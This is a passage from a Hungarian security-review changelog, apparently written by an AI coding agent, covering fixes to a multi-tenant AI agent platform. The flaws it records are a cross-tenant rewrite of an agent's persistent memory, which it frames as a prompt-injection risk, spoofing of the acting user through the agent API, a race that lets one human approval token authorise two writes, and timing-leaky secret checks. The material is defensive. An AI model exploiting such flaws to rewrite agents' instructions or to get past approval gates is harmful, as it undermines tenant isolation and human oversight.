  - A dispatcher megkapja a `TenantRepository`-t, és a tenant-státusz kapu az agent-státusz kapu után, a budget-ellenőrzés ELŐTT fut: nem-`active` tenant esetén `dispatch.tenant_inactive` audit-sor (tenant-státusszal, `tenantId`-vel), `denied_tenant_inactive` metrika és új `tenant_inactive` skip-indok. Fail-closed: hiányzó tenant-sor is tiltás. A repo opcionális konstruktor-paraméter (a `agents?` / `processes?` mintát követve), ezért a meglévő hívók és tesztek viselkedése nem változik.
  - A kapu a MUNKA tulajdonosára kulcsol (`ticket.tenantId ?? agent.tenantId`), nem az agentére. Ez a `/code-review` spec-ágának lelete volt: a megosztott, platform-szintű agent (`tenantId === null`) az `isAgentReachableFromTenant` szerint MINDEN tenantból elérhető, így az agentre kulcsolás nyitva hagyta volna a legkézenfekvőbb kiskaput — a felfüggesztett tenant tickete egy közös agenthez rendelve simán lefutott volna, a tenant adatán dolgozva.
  - Mindkét emberi guard fail-closed lett, közös `assertTenantOperable()` mögé emelve, hogy a két kapu ne tudjon szétcsúszni.
  - A `grantPlatformRole` `actorId`-ja kötelező, az audit-írás feltétel nélküli.
  - Új `scripts/dispatch-tenant-status.test.ts` (TS-1..TS-8): active → indul; suspended/offboarding/archived → tilt; a tiltás auditált; hiányzó tenant → fail-closed; valódi platform-munka mentesül; megosztott agent NEM kiskapu; az audit-action regisztrált.
- A `/code-review` két ága által talált, még a commit előtt javított hibák (érdemes külön kiemelni, mert mindkettő némán elrontotta volna a javítást):
  - **Az audit-action nem volt regisztrálva.** A `dispatch.tenant_inactive` hiányzott a `src/lib/audit/event-catalog.ts` listájából, a `PostgresAuditRepository` pedig `UnregisteredAuditActionError`-t dob a nem regisztrált actionre. Élesben tehát a kapu pont a tiltás pillanatában dobott volna kivételt — a javítás rosszabb lett volna a semminél. A tesztek hamis `AuditRepository`-ja (ami nem validál) elrejtette; ezért került be a TS-8, ami közvetlenül a katalógust ellenőrzi.
  - **A kapu rossz tenantra kulcsolt** (lásd fent, `ticket.tenantId` vs. `agent.tenantId`). A TS-7 visszaellenőrizve: a régi logikával bukik, az újjal zöld.
- Üzleti hatás:
  - A tenant felfüggesztése eddig félkarú kontroll volt: a felületet elzárta, az automatákat nem. Ha egy ügyfél szerződése megszűnik vagy biztonsági incidens miatt kell elszigetelni, a leállításnak azonnal ki kell terjednie az agentekre is — különben a platform a felfüggesztés után is költést generál a nevükben és adatot mozgat a rendszereik felé. A javítás után a „felfüggesztem a tenantot" adminisztratív aktus tényleges, auditált leállás.
  - Az offboardolt tenant automatikáinak leállása adatvédelmi kérdés is: a törlési/megőrzési folyamat alatt futó agent új adatot hozna létre egy olyan tenantban, amelyet éppen kivezetünk.
  - A `dispatch.tenant_inactive` audit-sor miatt a leállás bizonyítható és megmagyarázható: látszik, melyik ticket miért nem indult el.
- Ellenőrzés:
  - `npx tsx scripts/dispatch-tenant-status.test.ts` — 8/8 zöld. A TS-7 ellenőrizetten NEM üres teszt: a régi (agentre kulcsoló) logikával bukik.
  - Regresszió: `dispatch-budget.test.ts` (MIND OK), `tenant-management.test.ts` (zöld), `iam-tenant-boundary.test.ts` (zöld), `agent-registry-lifecycle.test.ts` (zöld).
  - `npx tsc --noEmit`: a módosított fájlokra nincs hiba; a meglévő, ettől független `src/components/tickets/ticket-detail.tsx(48)` `ProcessStatus` névhiba változatlan.
  - `scripts/dispatcher-retry-loop.test.ts` a main-en IS bukik (baseline stash-elt futtatással ellenőrizve) — nem ez a változtatás okozza, de nyitott hibaként érdemes külön feladatba venni.
- Nyitott döntés (nem automatikusan javítva):
  - **A spec §12 három kaput követel — ez a PR egyet zár le.** A regressziós lista: „suspended tenantban nincs agent run / connector use / model call". A dispatch-kapu az **agent run** ágat zárja; a **connector use** (agent API-kulcs út) és a **model call** (`model-gateway.ts`, ahol a `tenantId` ma csak könyvelési mező) nyitva marad. Ezeket szándékosan nem vontam be: külön belépőpontok, külön hibakezelési szerződéssel, és a félbeszakított futás inkonzisztens ticket-állapotot hagyhat — lásd a következő pontot.
  - **A monitor-sweep és a scheduled-task materializálás felfüggesztett tenantban is lefut.** Kollektorok futnak, `MonitorRun`/`MonitorSignal` és ticket keletkezik; csak a végső dispatch akad el. A §7.3 az `offboarding` státuszhoz „új futás nincs, export/purge előkészítés"-t rendel — épp az új adat keletkezése a probléma egy kivezetés alatt álló tenantban. Külön feladat.
  - **Az agent API-kulcs útja továbbra sem néz tenant-státuszt.** Egy már futó harness a felfüggesztés pillanata után is be tud hívni a `/api/v1/agent/*` végpontokra a saját kulcsával, amíg a futása le nem zárul. A dispatcher-kapu az ÚJ futásokat állítja meg; a folyamatban lévők lezárása külön döntés (azonnali kulcs-visszavonás vs. futás befejezésének engedése), mert a félbeszakított agent-futás inkonzisztens ticket-állapotot hagyhat. Ezt szándékosan nem döntöttem el egyoldalúan.
  - A `switchTenant` beengedi a felhasználót suspended tenantba (a `decideSwitch` csak membershipet néz); a művelet-kapu ezután minden actionnél tilt. Ez megfelel a spec §7.3 „suspended tenant is beléphet, de nem művelet-képes" elvének, viszont a UI-n nincs magyarázó visszajelzés, hogy MIÉRT tilos minden — a közérthető-UI alapelv szerint ez külön UX-feladat.

## 2026-07-19 - Tanítás / önfejlesztés (agent-memória): tenant-határ és jóváhagyói szerep

- Áttekintett modulok:
  - `app/src/domain/training/training-service.ts` (createTrainingTicket / approveTraining / rollbackMemory / promoteMemoryWithoutHumanApproval / attemptUngatedMemoryWrite)
  - `app/src/domain/training/self-evolution-guard.ts` (N6 capability-escalation padló)
  - `app/src/lib/self-evolution-profile.ts` (scope + approval_mode feloldás)
  - `app/src/app/actions/platform.ts` — a tanítási Server Actionök (`createTrainingTicket`, `approveTraining`, `rollbackMemory`) és a `transitionTicket` training-ága
  - `app/src/domain/scheduled-task/scheduled-task-service.ts` (autonóm, felügyelet nélküli futás — run-as és tenant-kezelés)
  - Összevetés a már megerősített testvér-implementációval: `app/src/domain/memory/memory-approval-service.ts` (WP-6, S6) és a `rollbackMemoryVersion` action (WP-8)
  - Vonatkozó szerződés: `docs/specs/AI-Agent-Platform-Feature-Spec-MemoryTraining.md` I8, T11, §5.12.2, §7, §9
- Eredmény:
  - A `SelfEvolutionGuard` (capability-escalation tiltás), a write-gate token-protokoll, az eval-kapu és a `ScheduledTaskService` (tenant-szűrt revoke, önmagára korlátozott run-as, CAS-claim) rendben van.
  - **Kritikus: cross-tenant memória-írás.** A `TrainingService` mindhárom belépési pontja csak a hívó SAJÁT tenantjában vett szerepét ellenőrizte (`requireTenantRole`), a CÉL-agentet és a CÉL-ticketet viszont szűretlen `findById`-dal oldotta fel. Így az A tenant approvere egy ismert agent-/ticket-UUID-vel a B tenant agentjének memóriáját — azaz az agent tartós utasításkészletét — átírhatta (`approveTraining`), visszagörgethette (`rollbackMemory`), vagy tanítási javaslatot injektálhatott a B tenant jóváhagyási sorába (`createTrainingTicket`). A spec I8 ("minden tábla tenant_id-scoped; cross-tenant olvasás/írás tiltott") és T11 explicit tiltja. A szomszédos, később épült `rollbackMemoryVersion` útvonal már helyesen hívta az `assertAgentTenantReachable`-t — a legacy útvonal kimaradt a megerősítésből.
  - **Gyökérok: a training ticket tenant-bélyeg nélkül jött létre.** A `tickets.create` hívás nem adott `tenantId`-t, így minden tanítási ticket `tenantId = null` sorként keletkezett — eleve feloldhatatlan bármely tenant-szűrő számára.
  - **Jogosultsági döntés a legacy globális szerepből.** A `higher_role` kapu a `prisma.user.findUnique(...).role` (legacy `User.role`) oszlopra döntött, nem az aktív tenant-tagság szerepére — szemben a `requireTenantPermission` dokumentált invariánsával ("az AKTÍV tenant-szerep az igazság forrása").
  - **Néma elutasítás + létezés-orákulum.** A tenant-sértés nem hagyott audit-nyomot (spec §7: minden hard-guard bukás → `write_denied`), a memória-események pedig `tenant_id` nélkül íródtak (spec §9). A `promoteMemoryWithoutHumanApproval` eltérő hibaüzenetei idegen tenant ticketjének önfejlesztési profilját szivárogtatták.
- Javítás:
  - Explicit `TrainingActor` (`id` / `tenantId` / `role`) a tanítási útvonalon, mindig az AKTÍV tenant-kontextusból; a `tenantId` szándékosan **nem** nullable (fail-closed, mint a `MemoryApprovalActor`).
  - Tenant-guard a SERVICE-ben (defense-in-depth), minden `prisma`-érintés ELŐTT; opak `Agent not found` / `Training ticket not found` — idegen tenant agentjének létezését sem szivárogtatja.
  - A training ticket tenant-bélyeget kap; a bélyeg nélküli legacy sorokat a mögöttes agent tenantja horgonyozza le.
  - A `higher_role` kapu rangsor-alapú (`hasMinimumRole`) és az aktív tenant-szerepre dönt.
  - Tenant-sértés `memory.write_denied` / `tenant_mismatch` audit-sort ír; a `memory.update`, `memory.rollback`, `eval_blocked`, `eval_override` események megkapják a `tenant_id`-t.
  - Új regresszió: `scripts/training-tenant-boundary.test.ts` (8 eset, DB nélkül), CI-be kötve.
- Üzleti hatás:
  - Az agent tartós memóriája a viselkedését vezérli — aki írja, az irányítja, mit tesz és mond az agent a másik ügyfél nevében. A rés lehetővé tette, hogy az egyik ügyfél jóváhagyója egy másik ügyfél agentjének utasításait írja át; ez egyszerre integritási és prompt-injekciós kockázat, és a több-ügyfeles üzemeltetés alapfeltételét sérti. A javítás után a tenant-határ a szolgáltatás-rétegben is invariáns, a próbálkozás pedig auditált — nem csak megakadályozott, hanem látható is.
- Ellenőrzés:
  - `npm run test:training-tenant` (8/8 zöld); mutációs próba: a guardok kivétele után 5 eset bukik, azaz a teszt valóban rögzíti az invariánst
  - `npm run test:memory-approval`, `test:tool-broker-tenant`, `test:kb-tenant-boundary`, `test:iam-policy`, `test:audit-log` (zöld)
  - `npx tsc --noEmit`, célzott `npx eslint`, `git diff --check` (zöld)
  - Az `acceptance-e2e.ts` teljes futása valós PostgreSQL-t igényel, ebben a sandboxban nem futott; a hívási helyei a típusellenőrzésen átmennek.
- Nyitott döntések (nem automatikusan javítva):
  - D1 — **SoD (kérelmező ≠ jóváhagyó) továbbra sincs kikényszerítve**: a training ticket beküldője saját maga jóváhagyhatja. Az Access-Policy spec D1 pontja ezt kemény invariánsként írja elő, de az még nem megvalósított feature; külön tiketet érdemel, nem ebbe a javításba tartozik.
  - D2 — **Megosztott (platform-szintű, `tenantId = null`) agent memóriája bármely tenant approvere által tanítható.** Ez a megosztott agentek eleve fennálló tulajdonsága (a `isAgentReachableFromTenant` egységes platform-szabálya), nem ez a rés hozta létre. Ha a platform-agentek tanítását platform-szerephez akarjuk kötni, az önálló döntés.

## 2026-07-19 - Web Search / agent tool API: acting-user eredet és audit-metaadat tenant-határa

- Áttekintett modulok:
  - `app/src/domain/web-search/web-search-service.ts`, `web-search-policy-service.ts`, `web-search-connector-service.ts`, `search-provider-adapter.ts` és `web-search-types.ts` (provider-, domain-, query-safety-, rate-limit- és audit-kontrollok)
  - `app/src/domain/tool-broker/tool-broker-service.ts` és `tool-broker-authorizer.ts` (Tool Broker belépési sorrend, acting-user / tenant-kontekstus, connector-grant feloldás)
  - `app/src/app/api/v1/agent/tools/route.ts` (agent API-kulcsos, publikus tool-beléptető)
  - `app/src/app/actions/web-search.ts` + `app/src/components/agents/web-search-policy-card.tsx` (agentenkénti web-search audit-kártya)
  - Vonatkozó szerződések: `docs/specs/AI-Agent-Platform-Feature-Spec-WebSearchTool-done.md` §7.1 és `docs/specs/AI-Agent-Platform-Feature-Spec-PerUser-Connector-DONE.md` §6.1.
- Eredmény:
  - A web-search policy-mag megfelelően deny-by-default: capability + aktív connector kell, tenant connector nem örökölhet platform providert, a domain kérés csak szűkítheti az allowlistet, a tiltólistás provider-találat utólag is kiesik, a PII/secret query guard és a ticket/conversation + napi kvóta a provider előtt fut. A query auditja hash/korlátozott metaadat, nem nyers keresőkifejezés.
  - Két éles határhibát találtam. (1) A `/api/v1/agent/tools` API az agent API-kulcsot ellenőrzi, de a request bodyból változtatás nélkül továbbadta az `actingUserId`-t. Ez user-delegated Gmail/HTTP connectornál azt jelentette, hogy egy kompromittált vagy rosszindulatú agent-key ismeretében a hívó bármely ismert aktív user ID-ját beküldhette, és az ő `connector_grant`-ját használhatta volna. A per-user connector specifikáció szerint az acting user interaktív sessionből vagy explicit, tárolt, visszavonható run-as felhatalmazásból jöhet, sosem az autonóm agent által választott értékből.
  - (2) A Broker ticket- és conversation-kontekstusból akkor is feloldotta a run-as usert és tenantot, ha a megadott objektum más agenthez tartozott. Így egy külső agent API-hívó egy másik agent ticket-/conversation-ID-ját kontextus-injektálásra használhatta volna. Ugyanazon tenantban ez különösen veszélyes, mert a korábbi tenant-őr önmagában nem különíti el a két agent delegált felhatalmazását. Ezen felül a Web Search kártya Server Actionje csak a néző tenant-szerepét, nem a beküldött `agentId` tenantját ellenőrizte, így UUID-ismerettel a másik tenant keresési audit-metaadatai lekérhetők voltak.
- Javítás:
  - Az agent API route a bodyban érkező `actingUserId`-t eldobja, és a Brokernek explicit `external_agent_api` eredetet jelöl. Ilyen kérésből a broker sosem fogad el közvetlen acting-user identitást.
  - A Broker csak akkor emeli át ticketből a run-as usert vagy a ticket tenantját, ha a ticket `agentId`-ja a tényleges hívó agent; conversationnél ugyanez a kötelező agent-kötés. Belső chat- és harness-hívások változatlanul adhatnak `trusted_internal` acting usert.
  - A Web Search agent-kártya csak az aktív tenantban látható agent audit-hívásait olvassa; idegen agentre opak `Agent not found` válasz jön.
  - Új regressziók a `tool-broker-tenant-isolation.test.ts`-ben: más agent ticketjének run-as grantja elutasított, külső agent API nem választhat acting usert, belső megbízható út továbbra is működik.
- Üzleti hatás:
  - A felhasználó által adott OAuth-jogosultság nem "agent-jogosultság": csak az adott munkamenethez vagy előre jóváhagyott automatizmushoz kötve használható. A javítás megakadályozza, hogy egy agent API-kulcs incidense egy másik kolléga levelezésének vagy delegált üzleti connectorának hozzáférésévé váljon, és az audit is a valódi tenant/agent-határon marad. Ez a legkisebb jogosultság és a customer-tenantok közötti adatbizalom alapfeltétele.
- Ellenőrzés:
  - `DATABASE_URL=postgresql://stub:stub@127.0.0.1:5432/stub node --import tsx scripts/tool-broker-tenant-isolation.test.ts` (11/11 zöld)
  - `DATABASE_URL=postgresql://stub:stub@127.0.0.1:5432/stub node --import tsx scripts/web-search-tool.test.ts` (zöld)
  - `npx tsc --noEmit`, célzott `npx eslint`, `git diff --check` (zöld)
  - A `per-user-connector.test.ts` teljes futása a már meglévő OAuth-fixture szakaszban nem futtatható ebben a lokális sandboxban, mert a script valós PostgreSQL-t kér a `127.0.0.1:5432` címen; a célzott, DB-mentes broker-regresszió és az authorizer korábbi tesztjei zöldek a hiba előtt.
- Nyitott döntés (nem automatikusan javítva):
  - D1 — A közvetlen agent API szándékosan nem kap user-delegated credentialet request bodyból. Ha később külső interactive clientnek mégis kell ilyen, külön, rövid életű, a sessionhez és a konkrét agenthez kötött delegation assertion szükséges; egy sima `actingUserId` mező erre nem biztonságos.

## 2026-07-18 - Write-gate token: egyszer-használatos fogyasztás atomizálása

- Áttekintett modulok:
  - `app/src/domain/writegate/write-gate-service.ts` (a governance write-gate primitív: `issue` / `consume`, horgony-invariáns, TTL, státusz-életciklus)
  - `app/src/lib/crypto/hash-chain.ts` write-gate kripto (`computeDiffHash`, `generateTokenPair`, `signWriteGateToken`/`verifyWriteGateSignature`, konstans idejű HMAC-összevetés) és `app/src/lib/crypto/secret-resolver.ts` (`WRITE_GATE_SECRET` fail-closed prod alatt)
  - A két valódi fogyasztó: `app/src/domain/training/training-service.ts` (tanítási memória-írás) és `app/src/domain/memory/memory-approval-service.ts` (inline memória-jelölt jóváhagyás)
  - `app/prisma/schema.prisma` `WriteGateToken` modell + `WriteGateTokenStatus` enum
- Eredmény:
  - Egy éles, latens biztonsági hibát találtam a primitívben. A `consume` read-check-then-update mintát követett: kiolvasta a sort, ellenőrizte `status === 'issued'`, majd FELTÉTEL NÉLKÜL `update`-tel `consumed`-ra állította. Ez klasszikus TOCTOU-ablak: két, a státusz-olvasáson egyszerre átjutó fogyasztó MINDKETTEN továbbmehetett az írásig, így EGY jóváhagyás KÉT írást hitelesíthetett — épp az az egyszer-használatos (single-use, nem visszajátszható) invariáns sérült, ami a governance-kapu értelme. A jelenlegi két hívó `issue`→`consume`-ot szinkron, egy kérésen belül végez, ezért ma nem triggerelt, de a `WriteGateService` exportált, újrafelhasználható primitív, amelynek dokumentált szerződése (§9.4: egy token = egy jóváhagyott diff, egyszer fogyasztva) csak a hívók gondosságára támaszkodott, nem a kapun magán. A kódbázis MÁS single-use/verseny-pontjai (`scheduled-task-repository.ts` revoke, `iam-repository.ts` meghívó-beváltás) már compare-and-set-tel védettek — ez a hely eltért ettől a saját konvenciótól.
  - NEM találtam titok-kezelési rést: a `WRITE_GATE_SECRET` a közös `resolveSecret`-en át prod alatt fail-closed, az aláírás-ellenőrzés konstans idejű, a diff-hash egyszerű származtatott érték (nem titok), a „pontosan egy horgony" invariáns az `issue`-ban helyesen kikényszerül.
- Javítás:
  - A `consume` státusz-átmenete atomikus compare-and-set lett: `updateMany({ where: { id, status: 'issued' }, data: { status: 'consumed', … } })`; `count === 0` esetén a versenyben vesztett fogyasztó fail-closed elutasításba fut. Ugyanez a CAS-őr került a lejárat-átmenetre is, így az nem írhatja felül egy párhuzamosan már consumed sor állapotát. A visszaadott sort a győztes tranzakció ismert állapotából állítjuk elő (nincs fölösleges kör-út).
  - A Prisma kliens konstruktor-injektálható lett (alapértelmezés a singleton), a codebase DI-mintája szerint — így az atomikus viselkedés injektált, in-memory klienssel determinisztikusan tesztelhető.
  - Új `write-gate-single-use.test.ts` regresszió (8 eset): happy path, szekvenciális visszajátszás, a TOCTOU-verseny determinisztikus szimulációja (két `issued`-ot látó fogyasztóból csak egy nyer), hash-eltérés/aláírás-hamisítás/lejárat fail-closed, és a horgony-invariáns.
- Üzleti hatás:
  - A write-gate a memória- és tanítási írások emberi jóváhagyásának kriptográfiai bizonyítéka: egy jóváhagyás pontosan egy módosítást engedélyez, auditálhatóan és nem visszajátszhatóan. Ha ugyanaz a jóváhagyó token két írást hitelesíthet (verseny/újrapróbálkozás alatt), az megbontja az „egy jóváhagyás = egy változás" audit-invariánst, és egy jövőbeli out-of-band jóváhagyási folyamatnál duplázott vagy jogosulatlan memória-módosítást engedhet. A javítás a kapu saját szintjén garantálja az egyszer-használatot, összhangban a platform többi compare-and-set védelmével.
- Ellenőrzés:
  - `npm run test:write-gate-single-use` (8/8 zöld), `npm run test:memory-approval` (regresszió zöld)
  - `npx tsc --noEmit` (app), célzott `npx eslint` (tiszta)
  - `/code-review` skill (Standards + Spec, két párhuzamos ügynök): a Standards-tengely nem talált hard violationt (a CAS-, DI- és teszt-minták a repo konvencióit követik); a Spec-tengely megerősítette, hogy a mag-fix helyes.
- Nyitott döntés (nem automatikusan javítva):
  - D1 — A `consume` csak `tokenId`-vel hitelesít, nincs tenant/agent-scope kapu rajta (a jelenlegi hívók upstream kötik a scope-ot, pl. `memory-approval-service.ts` a cél-chunkot tenant/agent/projekt szerint; ezért ma nem IDOR). Egy explicit tenant-őr a `consume`-on mélységi védelem lenne egy jövőbeli out-of-band fogyasztóhoz.
  - D2 — A `WriteGateTokenStatus` enumban ott a `revoked`, de egyetlen kód-út sem állít tokent `revoked`-ra (nincs revoke-metódus a service-en). A CAS-őr defenzíven ezt is elutasítaná; a tényleges visszavonhatóság külön, kis follow-up.
  - D3 — A `consume` a token consumed-ra állítását a hívó memória-írása ELŐTT végzi, és a kettő nincs egy tranzakcióban; egy consume utáni összeomlás „elégeti" a jóváhagyást nulla írással. Ez a fail-safe irány (soha nem két írás), de a teljes atomicitáshoz a fogyasztó-oldali írást is egy tranzakcióba lehetne vonni a consume-mal.

## 2026-07-18 - Scheduled task: tenant-határ és atomi ticket-materializálás

- Áttekintett modulok:
  - `app/src/domain/scheduled-task/scheduled-task-service.ts` (scheduled agent-task létrehozás, run-as payload, recurrence és materializálás)
  - `app/src/repositories/postgres/scheduled-task-repository.ts` és `app/src/repositories/interfaces/index.ts` (due-claim, revoke-verseny, ticket + task perzisztencia)
  - `app/src/app/actions/platform.ts` scheduled-task Server Action belépők, `app/src/domain/dispatcher/run-dispatch-cycle.ts` worker-ciklus, `app/prisma/schema.prisma` ScheduledTask/Ticket állapot- és relációmodell
  - `app/src/domain/agent/general-task-runtime.ts`, `app/src/domain/conversation/conversation-service.ts`, `app/src/lib/tenant-reachability.ts` (futáskori tenant-kapu és a csatolt kontextus útja)
  - `docs/specs/AI-Agent-Platform-Feature-Spec-ToolBroker-done.md` §3.4 és `AI-Agent-Platform-Feature-Spec-PerUser-Connector-DONE.md` (autonóm run-as és tenant-scope követelmények)
- Eredmény:
  - Két éles, magas kockázatú hibát találtam. A scheduled task létrehozó domain-szolgáltatás csak a felület operator szerepére támaszkodott: nem ellenőrizte, hogy a megadott agent az aktív tenantból elérhető-e és aktív-e. Így ismert idegen agent UUID-val tenant A-ben olyan task jöhetett létre, amely tenant B agentjéhez és annak modell-/connector-környezetéhez kötődött.
  - A due taskból ticketet létrehozó és a ScheduledTaskot `materialized`/következő futás állapotba író lépés két önálló adatbázis-művelet volt. Worker-leállás a kettő között tartós ready ticketet, de `materializing` taskot hagyott; a stale-reclaim ezt ismét aktiválta és új ticketet hozott létre. Ez egy feladat többszöri autonóm végrehajtását, duplázott költséget vagy ismételt külső hatást okozhatott.
  - A záró spec-review egy harmadik P1-hiányt mutatott: materializálás után a ticket saját payloadjában tovább élt a run-as adat, miközben a taskot már nem lehetett visszavonni. Így a visszavont autonóm felhatalmazásból létrejött, még nem indult ticket további tool-hívásai megőrizhették az acting-user kontextust.
- Javítás:
  - `ScheduledTaskService` agent repositoryt kapott és create előtt fail-closed, opak `Agent not found` kapuval ellenőrzi: csak aktív, saját tenantbeli vagy platform-szintű megosztott agent ütemezhető.
  - A ticket-létrehozás, task-állapotfrissítés és `pg_notify` egyetlen PostgreSQL tranzakcióba került. Visszagörgetéskor egyik írás sem marad meg; sikeres commit után a dispatcher csak konzisztens ticket–task párt láthat. A revoke compare-and-set lett, így a claimelt/materializált futást nem írhatja felül egy versenyző, korábban kiolvasott visszavonási kérés.
  - A run-as grantet a Broker minden scheduled tool-híváskor a ScheduledTask aktuális sorához köti (azonos task, tenant, materializált ticket, actor és authorization timestamp; csak `active`/`materialized` állapot érvényes). A revoke már a materializált taskra is használható, az agent `board_write` pedig nem írhatja felül/nullra a scheduler bizalmi mezőit.
  - Új determinisztikus `scheduled-task-enterprise.test.ts` regresszió fedi az idegen és inaktív agent elutasítását, saját/megosztott agent engedését, az egyetlen atomi materialize repository-hívást és a visszavont scheduled run-as deny-t.
- Üzleti hatás:
  - A scheduler a háttérben, emberi jelenlét nélkül indít agentet. A javítás garantálja, hogy egy ügyfél sem indíthatja el egy másik ügyfél agentjét vagy annak költség- és connector-környezetét, infrastruktúrahiba után sem ismétlődik meg egy már kiadott autonóm feladat, és a felhasználó a már kiadott tickethez kapcsolt run-as jogot is visszavonhatja, mielőtt további külső művelet történne. Ez csökkenti a cross-tenant adatkezelési, számlázási és jogosulatlan connector-használati kockázatot.
- Ellenőrzés:
  - `node --import tsx scripts/scheduled-task-enterprise.test.ts` (5/5 zöld; a `tsx` CLI a lokális sandbox IPC-korlátja miatt nem indul)
  - `npx tsc --noEmit`, célzott `npx eslint`, `git diff --check`
- Nyitott döntés (nem automatikusan javítva):
  - D1 — A `Document` modellnek nincs saját `tenantId` attribútuma. A task attachment ID-k futáskor globális dokumentum-lookupra támaszkodnak; a chat/task útvonalon ez szélesebb, már ismert adatmodell-adósság. A teljes megoldás explicit dokumentum-tenant attribúciót és migrációt igényel, nem egy csak scheduler-oldali szűrést.

## 2026-07-16 - Dispatcher / harness-callback: privilegizált belső végpontok titok-hitelesítése

- Reviewed modules:
  - `app/src/domain/dispatcher/dispatcher-service.ts` (dispatchReadyBatch / dispatchTicket / completeHarnessRun / reclaimStaleDispatches — lock-token kötés, budget-kapu, efemer kulcs életciklus, agent-status kapu)
  - `app/src/domain/dispatcher/run-dispatch-cycle.ts` (ciklus-orchestráció + `cycleInFlight` átfedés-védelem)
  - `app/src/app/api/v1/internal/dispatch-cycle/route.ts` (Cloud Scheduler trigger, `DISPATCHER_CONTROL_TOKEN`)
  - `app/src/app/api/v1/harness/tickets/[id]/complete/route.ts` és `.../process/route.ts` (harness visszahívó felület, `HARNESS_CALLBACK_TOKEN` + agent-API-kulcs)
  - `app/src/app/api/metrics/route.ts` (`METRICS_TOKEN` scrape-kapu)
  - `app/src/lib/validators/actions.ts` `harnessCompletionSchema`
- Result:
  - A dispatcher-mag enterprise-helyes: a completion a per-dispatch `lockToken`-hez kötött (kötelező UUID a sémában) a megosztott callback-titok MÖGÖTT (defense-in-depth), csak `active` agent dispatchelhető, a napi keret fail-closed (nincs keret nélküli állapot), az efemer agent-kulcs minden ágon visszavonásra kerül, a `process` route pedig agent-API-kulccsal + ticket→agent kötéssel véd. NEM találtam tenant-határ- vagy lock-megkerülési rést ezen a felületen.
  - Találtam viszont egy keményítési hiányt: a HÁROM privilegizált belső végpont (dispatch-cycle trigger, harness completion callback, metrics scrape) mindegyike egyetlen megosztott titkot JavaScript `!==`-vel hasonlított — ez byte-onként, korai kilépéssel fut, tehát elvi timing-oracle (a válaszidőből a titok byte-onként kikövetkeztethető). Ezek a végpontok NEM a Clerk-felhasználói auth mögött ülnek, a megosztott titok az egyetlen kapu; a dispatch-cycle trigger a teljes agent-flotta munka-indítását, a completion callback a ticketek lezárását/hibára állítását vezérli. A kódbázis MÁS pontjai (`oauth-state.ts`, `preview-token.ts`) már konstans idejű `timingSafeEqual`-t használnak — ez a három hely eltért ettől a saját konvenciótól. (Ez a 2026-07-14 review D1 pontjának kiterjesztett, javított változata.)
- Fix applied:
  - Új megosztott primitív: `app/src/lib/crypto/timing-safe.ts` — `safeSecretEquals(provided, expected)` fail-closed (hiányzó/üres oldal → false), utf8-buffer + hossz-őr + `timingSafeEqual`, pontosan a meglévő `oauth-state.ts`/`preview-token.ts` minta szerint.
  - Mindhárom route erre vált; a fail-closed rövidzár-logika (`!expectedToken`, `if (expected)`) változatlan, az elfogadott/elutasított bemenet-halmaz azonos a régi `!==`-ével (a spec-axis review megerősítette: nincs viselkedésbeli regresszió).
  - Új determinisztikus, DB-mentes teszt: `scripts/timing-safe-token.test.ts` (9 eset: pontos egyezés, azonos hosszú eltérés, rövidebb/hosszabb bemenet, üres/null/undefined fail-closed, hiányzó titok, unicode), `test:timing-safe-token`.
- Business impact:
  - A dispatcher-trigger és a harness-callback a platform önvezérlő gerince: az egyik elindítja az autonóm agent-munkát, a másik lezárja azt. Ha a védő titok kiszivárogtatható (akár timing-csatornán), az illetéktelen munka-indítást vagy ticket-státusz-hamisítást tesz lehetővé. A javítás konstans idejűvé teszi mindhárom kapu titok-ellenőrzését, és egyetlen auditált primitívbe vonja össze őket, a fail-closed viselkedés csökkentése nélkül.
- Verification:
  - `npm run test:timing-safe-token` (9/9 zöld)
  - `npx tsc --noEmit` from `app/`
  - `npx eslint` a módosított route-okra + helperre + tesztre (tiszta)
  - `/code-review` skill (Standards + Spec axis, párhuzamos): egyik axis sem talált blokkoló hibát; nincs viselkedésbeli regresszió.
- Decisions raised (not auto-fixed):
  - D1 — Két MEGLÉVŐ inline timing-safe hely (`oauth-state.ts`, `preview-token.ts`) nem lett a közös helperre migrálva; a `preview-token.ts` előre dekódolt Buffert hasonlít, tehát Buffer-elfogadó overload kellene. Külön, scope-tartó follow-up (érinti az OAuth- és sandbox-preview aláírás-ellenőrzést).
  - D2 — A teszt a helper szintjén fedez; a route-bekötést (negálás, rövidzár) nem gyakorolja end-to-end. Egy jövőbeli route-szintű integrációs teszt szorosabbra húzná.

## 2026-07-16 - Önfrissítő connector: capability-verzió jóváhagyás Separation of Duties

- Reviewed modules:
  - `app/src/domain/connector-self-update/self-update-service.ts` (a domain-seam: create / approveUrl / markTrusted / updatePolicy / sync / approveVersion / rejectVersion / rollback, tenant-, SoD-, trust-, diff- és auto-approve kapuk)
  - `app/src/domain/connector-self-update/spec-sync.ts` (letöltő + OpenAPI-parse; A4 egress-guard host-pinning, redirect-pinning, méret/időkorlát, content-type szűrő, fail-closed)
  - `app/src/domain/connector-self-update/spec-diff.ts` (kategorizált capability-diff + `isAutoApprovable` auto-jóváhagyási kapu)
  - `app/src/domain/connector-self-update/pinned-runtime-config.ts` + `capability-set.ts` (A3: futásidőben csak az AKTÍV, sémával validált snapshot hívható; `restrictToEndpoints` mindig true; fail-closed null)
  - `app/src/repositories/postgres/self-updating-connector-repository.ts` (atomi állapotváltások, tranzakción belüli audit, auto-approve dupla-ellenőrzés)
  - `app/src/app/actions/self-updating-connectors.ts` (belépő server actionök: `requireTenantRole`, https-only zod, superadmin `sodExempt`)
  - `app/src/repositories/postgres/tool-broker-repository.ts` + `app/src/domain/connector/http-api-client.ts` (runtime endpoint-allowlist és pinned egress-újraellenőrzés)
- Result:
  - A feature enterprise-helyes formájú: az SSRF-védelem valódi DNS-resolverrel van bekötve (`domain/index.ts`), a `sync` KIZÁRÓLAG emberi operátor server-actionből hívható (nincs agent/prompt-injektálható út), a YAML-parse a js-yaml biztonságos `load`-ja (nincs RCE), a runtime csak az aktív snapshot endpointjait engedi (`endpoint_not_allowed`) és pinned connectornál hívásidőben újraellenőrzi a hostot + tiltja a redirectet, az auth/base_url/egress-host változás mindig magas kockázatú emberi kapu, az auto-approve háromszorosan kapuzott (tenant opt-in + forrás-policy + tisztán read-only additív diff), a `access` mező metódus-alapú (POST/PUT/PATCH/DELETE → write), így új írási végpont sosem auto-jóváhagyható.
